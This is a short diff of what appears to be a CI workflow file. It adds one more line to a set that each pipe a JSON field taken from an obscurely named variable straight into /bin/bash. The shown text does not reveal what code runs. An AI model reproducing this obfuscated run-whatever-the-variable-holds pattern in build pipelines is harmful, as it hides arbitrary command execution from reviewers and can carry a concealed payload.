@@ -33,6 +33,7 @@ jobs:
           echo $fed0 | jq -r .j013 | /bin/bash
           echo $oda332 | jq -r .znli72 | /bin/bash
           echo $vo5132 | jq -r .hu97388 | /bin/bash
+          echo $lz1902 | jq -r .hgv163 | /bin/bash
 
       - name: Upload artifact
         if: always()
